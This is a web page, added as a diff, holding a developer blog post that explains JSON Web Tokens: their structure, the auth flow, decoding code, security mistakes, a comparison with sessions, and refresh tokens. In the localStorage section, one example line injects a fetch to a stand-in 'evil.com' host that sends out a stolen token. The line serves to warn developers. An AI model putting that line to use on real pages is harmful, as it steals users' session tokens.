@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>JWT Tokens Explained: What They Are, How They Work, and How to Decode Them | ClickSolveTools Blog</title>
+  <meta name="description" content="Understand the three parts of a JWT, how the auth flow works, common security mistakes to avoid, and when to use JWTs vs session cookies.">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://clicksolvetools.com/blog/jwt-tokens-explained">
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-180.png">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
+  <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date());gtag('consent','default',{'analytics_storage':'denied','ad_storage':'denied','ad_user_data':'denied','ad_personalization':'denied','wait_for_update':500});gtag('config','G-XXXXXXXXXX');</script>
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="JWT Tokens Explained: What They Are, How They Work, and How to Decode Them">
+  <meta property="og:description" content="Understand the three parts of a JWT, how the auth flow works, common security mistakes to avoid, and when to use JWTs vs session cookies.">
+  <meta property="og:url" content="https://clicksolvetools.com/blog/jwt-tokens-explained">
+  <meta property="og:image" content="https://clicksolvetools.com/images/logo.png">
+  <meta property="og:site_name" content="ClickSolveTools">
+  <meta property="article:published_time" content="2025-09-02">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="JWT Tokens Explained: What They Are, How They Work, and How to Decode Them">
+  <meta name="twitter:description" content="Understand the three parts of a JWT, how the auth flow works, common security mistakes to avoid, and when to use JWTs vs session cookies.">
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"JWT Tokens Explained: What They Are, How They Work, and How to Decode Them","description":"Understand the three parts of a JWT, how the auth flow works, common security mistakes to avoid, and when to use JWTs vs session cookies.","url":"https://clicksolvetools.com/blog/jwt-tokens-explained","datePublished":"2025-09-02","publisher":{"@type":"Organization","name":"ClickSolveTools","logo":{"@type":"ImageObject","url":"https://clicksolvetools.com/images/logo.png"}},"author":{"@type":"Organization","name":"ClickSolveTools"}}</script>
+</head>
+<body class="bg-[#f8fafc] text-[#1e293b] min-h-screen">
+  <div id="nav-container"></div>
+
+  <article class="max-w-3xl mx-auto px-4 py-12">
+    <nav class="text-sm text-[#94a3b8] mb-8">
+      <a href="/" class="hover:text-[#2563eb]">Home</a>
+      <span class="mx-2">→</span>
+      <a href="/blog" class="hover:text-[#2563eb]">Blog</a>
+      <span class="mx-2">→</span>
+      <span class="text-[#1e293b]">JWT Tokens Explained</span>
+    </nav>
+
+    <header class="mb-10">
+      <div class="flex flex-wrap gap-2 mb-4">
+        <span class="text-xs px-3 py-1 bg-[#eff6ff] text-[#2563eb] rounded-full font-medium">Guides</span>
+        <span class="text-xs px-3 py-1 bg-[#f1f5f9] text-[#94a3b8] rounded-full">JWT</span>
+        <span class="text-xs px-3 py-1 bg-[#f1f5f9] text-[#94a3b8] rounded-full">authentication</span>
+        <span class="text-xs px-3 py-1 bg-[#f1f5f9] text-[#94a3b8] rounded-full">tokens</span>
+        <span class="text-xs px-3 py-1 bg-[#f1f5f9] text-[#94a3b8] rounded-full">developer</span>
+      </div>
+      <h1 class="text-3xl md:text-4xl font-bold leading-tight mb-4 text-[#1e293b]">JWT Tokens Explained: What They Are, How They Work, and How to Decode Them</h1>
+      <div class="flex items-center gap-4 text-sm text-[#94a3b8]">
+        <time datetime="2025-09-02">September 2, 2025</time>
+        <span>·</span>
+        <span>8 min read</span>
+      </div>
+    </header>
+
+    <div class="prose max-w-none space-y-6 text-[#475569] leading-relaxed">
+
+      <p>If you've built a web application in the last decade, you've almost certainly encountered JSON Web Tokens (JWTs). They're used by Firebase, Auth0, AWS Cognito, and countless custom auth systems. But despite their ubiquity, many developers use JWTs without fully understanding what's inside them, how the signature works, or what security pitfalls to avoid.</p>
+
+      <p>This guide breaks down JWTs from the ground up: what each part contains, how the authentication flow works, and the mistakes that lead to real vulnerabilities. You can decode any JWT instantly with our <a href="/tools/jwt-decoder" class="text-[#2563eb] hover:underline">JWT Decoder</a>.</p>
+
+      <h2 class="text-2xl font-bold text-[#1e293b] mt-10 mb-4">What Is a JWT?</h2>
+
+      <p>A JSON Web Token is a compact, URL-safe string that carries claims (pieces of information) between two parties. It's defined by <a href="https://datatracker.ietf.org/doc/html/rfc7519" class="text-[#2563eb] hover:underline">RFC 7519</a> and consists of three parts separated by dots:</p>
+
+      <code class="bg-[#f1f5f9] border border-[#e2e8f0] rounded-lg p-4 font-mono text-sm text-[#1e293b] block overflow-x-auto my-4">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwiaWF0IjoxNjkwMDAwMDAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+|___________________________________|.|_______________________________________________|.|___________________________________|
+            HEADER                                       PAYLOAD                                    SIGNATURE</code>
+
+      <p>Each part is Base64URL-encoded. The header and payload are plain JSON — they're encoded, not encrypted. Anyone can decode them. The signature is what prevents tampering.</p>
+
+      <h2 class="text-2xl font-bold text-[#1e293b] mt-10 mb-4">Part 1: The Header</h2>
+
+      <p>The header declares the token type and the signing algorithm. When decoded, it looks like this:</p>
+
+      <code class="bg-[#f1f5f9] border border-[#e2e8f0] rounded-lg p-4 font-mono text-sm text-[#1e293b] block overflow-x-auto my-4">{
+  "alg": "HS256",
+  "typ": "JWT"
+}</code>
+
+      <p>The two most important header fields:</p>
+
+      <ul class="list-disc list-inside space-y-2">
+        <li><strong class="text-[#1e293b]">alg</strong> — The signing algorithm. Common values: <code>HS256</code> (HMAC-SHA256, symmetric), <code>RS256</code> (RSA-SHA256, asymmetric), <code>ES256</code> (ECDSA-SHA256, asymmetric)</li>
+        <li><strong class="text-[#1e293b]">typ</strong> — Usually "JWT". Some systems use "at+jwt" for access tokens to distinguish from other token types</li>
+      </ul>
+
+      <p>You may also see <strong class="text-[#1e293b]">kid</strong> (key ID) in the header, which tells the server which signing key was used — important when keys are rotated.</p>
+
+      <h2 class="text-2xl font-bold text-[#1e293b] mt-10 mb-4">Part 2: The Payload (Claims)</h2>
+
+      <p>The payload contains the claims — the actual data the token carries. Claims are key-value pairs. The JWT spec defines several standard ("registered") claims:</p>
+
+      <table class="w-full text-sm border-collapse my-6">
+        <thead>
+          <tr>
+            <th class="text-left p-3 bg-[#f1f5f9] border border-[#e2e8f0] font-semibold text-[#1e293b]">Claim</th>
+            <th class="text-left p-3 bg-[#f1f5f9] border border-[#e2e8f0] font-semibold text-[#1e293b]">Name</th>
+            <th class="text-left p-3 bg-[#f1f5f9] border border-[#e2e8f0] font-semibold text-[#1e293b]">Description</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]"><code>sub</code></td>
+            <td class="p-3 border border-[#e2e8f0]">Subject</td>
+            <td class="p-3 border border-[#e2e8f0]">Who the token is about (usually a user ID)</td>
+          </tr>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]"><code>iss</code></td>
+            <td class="p-3 border border-[#e2e8f0]">Issuer</td>
+            <td class="p-3 border border-[#e2e8f0]">Who issued the token (e.g., "https://auth.example.com")</td>
+          </tr>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]"><code>aud</code></td>
+            <td class="p-3 border border-[#e2e8f0]">Audience</td>
+            <td class="p-3 border border-[#e2e8f0]">Who the token is intended for (e.g., "api.example.com")</td>
+          </tr>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]"><code>exp</code></td>
+            <td class="p-3 border border-[#e2e8f0]">Expiration</td>
+            <td class="p-3 border border-[#e2e8f0]">Unix timestamp when the token expires</td>
+          </tr>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]"><code>iat</code></td>
+            <td class="p-3 border border-[#e2e8f0]">Issued At</td>
+            <td class="p-3 border border-[#e2e8f0]">Unix timestamp when the token was created</td>
+          </tr>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]"><code>nbf</code></td>
+            <td class="p-3 border border-[#e2e8f0]">Not Before</td>
+            <td class="p-3 border border-[#e2e8f0]">Token is not valid before this time</td>
+          </tr>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]"><code>jti</code></td>
+            <td class="p-3 border border-[#e2e8f0]">JWT ID</td>
+            <td class="p-3 border border-[#e2e8f0]">Unique identifier for this token (prevents replay)</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <p>A typical payload for an authenticated user looks like this:</p>
+
+      <code class="bg-[#f1f5f9] border border-[#e2e8f0] rounded-lg p-4 font-mono text-sm text-[#1e293b] block overflow-x-auto my-4">{
+  "sub": "user_8f3a9b2c",
+  "name": "Alice Chen",
+  "email": "alice@example.com",
+  "role": "admin",
+  "iss": "https://auth.myapp.com",
+  "aud": "https://api.myapp.com",
+  "iat": 1690000000,
+  "exp": 1690003600
+}</code>
+
+      <p><strong class="text-[#1e293b]">Critical reminder:</strong> The payload is not encrypted. Anyone with the token can decode it and read these values. Never put sensitive data like passwords, credit card numbers, or API secrets in a JWT payload.</p>
+
+      <h2 class="text-2xl font-bold text-[#1e293b] mt-10 mb-4">Part 3: The Signature</h2>
+
+      <p>The signature is what makes JWTs tamper-proof. It's generated by taking the encoded header, the encoded payload, and a secret key, then running them through the signing algorithm:</p>
+
+      <code class="bg-[#f1f5f9] border border-[#e2e8f0] rounded-lg p-4 font-mono text-sm text-[#1e293b] block overflow-x-auto my-4">HMACSHA256(
+  base64UrlEncode(header) + "." + base64UrlEncode(payload),
+  secret
+)</code>
+
+      <p>When the server receives a JWT, it recomputes the signature using its secret key. If the signature doesn't match, the token has been tampered with and is rejected. This means a user cannot change their <code>role</code> from "user" to "admin" in the payload — the signature check will fail.</p>
+
+      <h3 class="text-xl font-semibold text-[#1e293b] mt-8 mb-3">HMAC (HS256) vs. RSA (RS256)</h3>
+
+      <table class="w-full text-sm border-collapse my-6">
+        <thead>
+          <tr>
+            <th class="text-left p-3 bg-[#f1f5f9] border border-[#e2e8f0] font-semibold text-[#1e293b]">Algorithm</th>
+            <th class="text-left p-3 bg-[#f1f5f9] border border-[#e2e8f0] font-semibold text-[#1e293b]">Type</th>
+            <th class="text-left p-3 bg-[#f1f5f9] border border-[#e2e8f0] font-semibold text-[#1e293b]">How It Works</th>
+            <th class="text-left p-3 bg-[#f1f5f9] border border-[#e2e8f0] font-semibold text-[#1e293b]">Best For</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]">HS256</td>
+            <td class="p-3 border border-[#e2e8f0]">Symmetric</td>
+            <td class="p-3 border border-[#e2e8f0]">Same secret signs and verifies</td>
+            <td class="p-3 border border-[#e2e8f0]">Single-service apps where the signer and verifier are the same server</td>
+          </tr>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]">RS256</td>
+            <td class="p-3 border border-[#e2e8f0]">Asymmetric</td>
+            <td class="p-3 border border-[#e2e8f0]">Private key signs, public key verifies</td>
+            <td class="p-3 border border-[#e2e8f0]">Microservices, third-party auth (Auth0, Firebase). Services only need the public key to verify</td>
+          </tr>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]">ES256</td>
+            <td class="p-3 border border-[#e2e8f0]">Asymmetric</td>
+            <td class="p-3 border border-[#e2e8f0]">ECDSA with P-256 curve</td>
+            <td class="p-3 border border-[#e2e8f0]">Same as RS256 but with smaller keys and faster verification</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h2 class="text-2xl font-bold text-[#1e293b] mt-10 mb-4">The JWT Authentication Flow</h2>
+
+      <p>Here's how JWTs are typically used in a web application:</p>
+
+      <code class="bg-[#f1f5f9] border border-[#e2e8f0] rounded-lg p-4 font-mono text-sm text-[#1e293b] block overflow-x-auto my-4">1. User sends login credentials
+   POST /auth/login  { "email": "alice@example.com", "password": "••••••" }
+
+2. Server verifies credentials, generates a JWT
+   → signs { sub: "user_8f3a9b", role: "admin", exp: ... } with secret key
+
+3. Server returns the JWT to the client
+   { "access_token": "eyJhbGciOiJI...", "expires_in": 3600 }
+
+4. Client stores the token and sends it with every API request
+   Authorization: Bearer eyJhbGciOiJI...
+
+5. Server verifies the signature and checks expiry on each request
+   → if valid, reads claims and processes the request
+   → if invalid or expired, returns 401 Unauthorized</code>
+
+      <p>The key advantage: the server doesn't need to store session state. The token itself contains everything needed to authenticate the user. This is why JWTs are called "stateless" — the server can verify the token without hitting a database or session store.</p>
+
+      <h2 class="text-2xl font-bold text-[#1e293b] mt-10 mb-4">How to Decode a JWT</h2>
+
+      <p>Since the header and payload are just Base64URL-encoded JSON, you can decode them trivially:</p>
+
+      <code class="bg-[#f1f5f9] border border-[#e2e8f0] rounded-lg p-4 font-mono text-sm text-[#1e293b] block overflow-x-auto my-4">// JavaScript — decode a JWT payload
+function decodeJWT(token) {
+  const parts = token.split('.');
+  const header = JSON.parse(atob(parts[0]));
+  const payload = JSON.parse(atob(parts[1]));
+  return { header, payload };
+}
+
+// Usage
+const { header, payload } = decodeJWT('eyJhbGciOiJIUzI1NiI...');
+console.log(payload.sub);  // "user_8f3a9b2c"
+console.log(payload.exp);  // 1690003600
+
+// Check if expired
+const isExpired = payload.exp * 1000 &lt; Date.now();
+</code>
+
+      <code class="bg-[#f1f5f9] border border-[#e2e8f0] rounded-lg p-4 font-mono text-sm text-[#1e293b] block overflow-x-auto my-4"># Python — decode without verification (for inspection only)
+import base64, json
+
+def decode_jwt(token):
+    parts = token.split('.')
+    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
+    return payload
+
+# Command line with jq
+echo 'eyJhbGci...' | cut -d. -f2 | base64 -d | jq .</code>
+
+      <p>For quick decoding without writing code, paste any token into our <a href="/tools/jwt-decoder" class="text-[#2563eb] hover:underline">JWT Decoder</a>. It shows the header, payload, and expiration status instantly.</p>
+
+      <h2 class="text-2xl font-bold text-[#1e293b] mt-10 mb-4">Common Security Mistakes With JWTs</h2>
+
+      <h3 class="text-xl font-semibold text-[#1e293b] mt-8 mb-3">1. Storing JWTs in localStorage</h3>
+
+      <p>This is the most debated topic in JWT security. <strong class="text-[#1e293b]">localStorage</strong> is accessible to any JavaScript running on the page, which means a single XSS vulnerability lets an attacker steal every user's token.</p>
+
+      <code class="bg-[#f1f5f9] border border-[#e2e8f0] rounded-lg p-4 font-mono text-sm text-[#1e293b] block overflow-x-auto my-4">// Vulnerable — any XSS can steal this
+localStorage.setItem('token', jwt);
+
+// If an attacker injects this script:
+fetch('https://evil.com/steal?token=' + localStorage.getItem('token'));</code>
+
+      <p><strong class="text-[#1e293b]">Better approach:</strong> Store JWTs in HttpOnly, Secure, SameSite cookies. HttpOnly cookies cannot be accessed by JavaScript, eliminating the XSS token theft vector entirely.</p>
+
+      <h3 class="text-xl font-semibold text-[#1e293b] mt-8 mb-3">2. Not Validating Token Expiry</h3>
+
+      <p>The <code>exp</code> claim is just a number in the payload. If your server doesn't check it, expired tokens continue to work indefinitely. Always verify expiry server-side:</p>
+
+      <code class="bg-[#f1f5f9] border border-[#e2e8f0] rounded-lg p-4 font-mono text-sm text-[#1e293b] block overflow-x-auto my-4">// Node.js with jsonwebtoken
+const jwt = require('jsonwebtoken');
+
+try {
+  const decoded = jwt.verify(token, secretKey); // checks exp automatically
+} catch (err) {
+  if (err.name === 'TokenExpiredError') {
+    return res.status(401).json({ error: 'Token expired' });
+  }
+}</code>
+
+      <h3 class="text-xl font-semibold text-[#1e293b] mt-8 mb-3">3. Not Checking the Audience (aud) Claim</h3>
+
+      <p>If you issue tokens for multiple services, a token intended for your billing service could be used against your admin API if you don't check <code>aud</code>. Always validate that the audience matches the current service.</p>
+
+      <h3 class="text-xl font-semibold text-[#1e293b] mt-8 mb-3">4. Using the "none" Algorithm</h3>
+
+      <p>The JWT spec allows <code>"alg": "none"</code>, which means no signature. If your verification library accepts unsigned tokens, an attacker can forge any claims. Always explicitly specify which algorithms your server accepts:</p>
+
+      <code class="bg-[#f1f5f9] border border-[#e2e8f0] rounded-lg p-4 font-mono text-sm text-[#1e293b] block overflow-x-auto my-4">// DANGEROUS — accepts any algorithm including "none"
+jwt.verify(token, secretKey);
+
+// SAFE — explicitly whitelist algorithms
+jwt.verify(token, secretKey, { algorithms: ['HS256'] });</code>
+
+      <h3 class="text-xl font-semibold text-[#1e293b] mt-8 mb-3">5. Using Long-Lived Access Tokens</h3>
+
+      <p>JWTs cannot be revoked once issued (they're stateless). If you issue tokens with a 30-day expiry and a user's account is compromised, that token remains valid for 30 days. Use short-lived access tokens (5-15 minutes) paired with refresh tokens that can be revoked server-side.</p>
+
+      <h2 class="text-2xl font-bold text-[#1e293b] mt-10 mb-4">JWTs vs. Session Cookies</h2>
+
+      <table class="w-full text-sm border-collapse my-6">
+        <thead>
+          <tr>
+            <th class="text-left p-3 bg-[#f1f5f9] border border-[#e2e8f0] font-semibold text-[#1e293b]">Feature</th>
+            <th class="text-left p-3 bg-[#f1f5f9] border border-[#e2e8f0] font-semibold text-[#1e293b]">JWT</th>
+            <th class="text-left p-3 bg-[#f1f5f9] border border-[#e2e8f0] font-semibold text-[#1e293b]">Session Cookie</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]">State</td>
+            <td class="p-3 border border-[#e2e8f0]">Stateless (no server storage)</td>
+            <td class="p-3 border border-[#e2e8f0]">Stateful (server stores session data)</td>
+          </tr>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]">Revocation</td>
+            <td class="p-3 border border-[#e2e8f0]">Cannot revoke (until expiry)</td>
+            <td class="p-3 border border-[#e2e8f0]">Delete from session store instantly</td>
+          </tr>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]">Scaling</td>
+            <td class="p-3 border border-[#e2e8f0]">Easy — any server can verify</td>
+            <td class="p-3 border border-[#e2e8f0]">Requires shared session store (Redis)</td>
+          </tr>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]">Payload size</td>
+            <td class="p-3 border border-[#e2e8f0]">Larger (claims in token)</td>
+            <td class="p-3 border border-[#e2e8f0]">Small (just a session ID)</td>
+          </tr>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]">Cross-domain</td>
+            <td class="p-3 border border-[#e2e8f0]">Works via Authorization header</td>
+            <td class="p-3 border border-[#e2e8f0]">Limited by cookie same-origin policy</td>
+          </tr>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]">XSS risk</td>
+            <td class="p-3 border border-[#e2e8f0]">High if stored in localStorage</td>
+            <td class="p-3 border border-[#e2e8f0]">Low with HttpOnly cookies</td>
+          </tr>
+          <tr>
+            <td class="p-3 border border-[#e2e8f0]">CSRF risk</td>
+            <td class="p-3 border border-[#e2e8f0]">Low (sent in header, not auto-attached)</td>
+            <td class="p-3 border border-[#e2e8f0]">Requires CSRF tokens</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <p><strong class="text-[#1e293b]">When to use JWTs:</strong> Microservice architectures, mobile apps, cross-domain APIs, and third-party integrations where stateless verification is essential.</p>
+
+      <p><strong class="text-[#1e293b]">When to use sessions:</strong> Traditional server-rendered apps, apps that need instant session revocation (e.g., banking), and simple setups where scaling session storage isn't a concern.</p>
+
+      <p>Many production systems use a hybrid approach: JWTs stored in HttpOnly cookies for the best of both worlds — stateless verification with cookie-based security protections.</p>
+
+      <h2 class="text-2xl font-bold text-[#1e293b] mt-10 mb-4">Access Tokens and Refresh Tokens</h2>
+
+      <p>Production auth systems typically use two tokens:</p>
+
+      <ul class="list-disc list-inside space-y-2">
+        <li><strong class="text-[#1e293b]">Access token</strong> — Short-lived (5-15 minutes). Sent with every API request. If compromised, the damage window is small.</li>
+        <li><strong class="text-[#1e293b]">Refresh token</strong> — Long-lived (7-30 days). Stored securely (HttpOnly cookie). Used only to get a new access token when the current one expires. Can be revoked server-side.</li>
+      </ul>
+
+      <code class="bg-[#f1f5f9] border border-[#e2e8f0] rounded-lg p-4 font-mono text-sm text-[#1e293b] block overflow-x-auto my-4">// Refresh flow
+1. Access token expires (401 response)
+2. Client sends refresh token to POST /auth/refresh
+3. Server validates refresh token, issues new access token
+4. Client retries the original request with the new access token
+
+// If the refresh token is also expired or revoked → user must log in again</code>
+
+      <p>This pattern gives you the stateless benefits of JWTs for most requests while maintaining the ability to revoke sessions when needed.</p>
+
+      <h2 class="text-2xl font-bold text-[#1e293b] mt-10 mb-4">Frequently Asked Questions</h2>
+
+      <h3 class="text-xl font-semibold text-[#1e293b] mt-8 mb-3">Are JWTs encrypted?</h3>
+      <p>Standard JWTs (JWS — JSON Web Signature) are signed but not encrypted. The payload is Base64URL-encoded, which is trivially reversible — it's encoding, not encryption. Anyone who has the token can read the payload. If you need encrypted tokens, use JWE (JSON Web Encryption), which adds a layer of encryption on top. However, most applications don't need JWE — just avoid putting sensitive data in the payload and transport tokens over HTTPS.</p>
+
+      <h3 class="text-xl font-semibold text-[#1e293b] mt-8 mb-3">Can I revoke a JWT before it expires?</h3>
+      <p>Not with the token alone — that's the trade-off of stateless auth. The most common workaround is maintaining a server-side blocklist (denylist) of revoked token IDs (<code>jti</code> claims). When a user logs out or their account is suspended, add their token's <code>jti</code> to the blocklist. On each request, check the blocklist before accepting the token. This adds a small stateful check but preserves the stateless benefits for the 99% of requests where tokens are valid. Using short-lived access tokens (5-15 minutes) minimizes how long a compromised token remains usable.</p>
+
+      <h3 class="text-xl font-semibold text-[#1e293b] mt-8 mb-3">Where should I store JWTs on the client?</h3>
+      <p>The safest option is an <strong class="text-[#1e293b]">HttpOnly, Secure, SameSite=Strict cookie</strong>. This prevents JavaScript access (blocking XSS theft) and only sends the cookie over HTTPS to the same origin. If you must use the Authorization header (e.g., for cross-domain APIs), store the token in memory (a JavaScript variable) and accept that it's lost on page refresh — use a refresh token in an HttpOnly cookie to get a new access token silently. Avoid localStorage and sessionStorage for tokens.</p>
+
+      <h3 class="text-xl font-semibold text-[#1e293b] mt-8 mb-3">What happens if my JWT signing secret is compromised?</h3>
+      <p>If the secret key leaks, an attacker can forge valid tokens for any user with any claims. This is a complete authentication bypass. You must rotate the key immediately, which invalidates all existing tokens and forces every user to re-authenticate. With asymmetric algorithms (RS256), only the private key is dangerous — the public key is safe to distribute. This is why RS256 is preferred in environments where multiple services verify tokens, as only the auth service needs the private key.</p>
+
+      <h3 class="text-xl font-semibold text-[#1e293b] mt-8 mb-3">How long should a JWT access token last?</h3>
+      <p>For most web applications, 5 to 15 minutes is the recommended range. Shorter expiry limits the damage window if a token is stolen, while the refresh token mechanism ensures a seamless user experience. For highly sensitive applications (banking, healthcare), consider even shorter windows of 1-5 minutes. For lower-risk internal tools, 30-60 minutes may be acceptable. Never use access tokens that last days or weeks — that's what refresh tokens are for.</p>
+
+    </div>
+  </article>
+
+  <div id="related-tool-cards"></div>
+  <div id="more-posts"></div>
+  <div id="footer-container"></div>
+
+  <script type="module">
+    import { renderBlogNav, renderFooter, renderMorePosts, renderRelatedToolCards } from '/js/shared.js';
+    import { initConsent } from '/js/consent.js'; initConsent();
+    renderBlogNav('JWT Tokens Explained: What They Are, How They Work, and How to Decode Them');
+    renderFooter();
+    renderMorePosts('jwt-tokens-explained', 'Guides');
+    renderRelatedToolCards(['jwt-decoder', 'base64-encoder-decoder', 'hash-generator']);
+  </script>
+</body>
+</html>
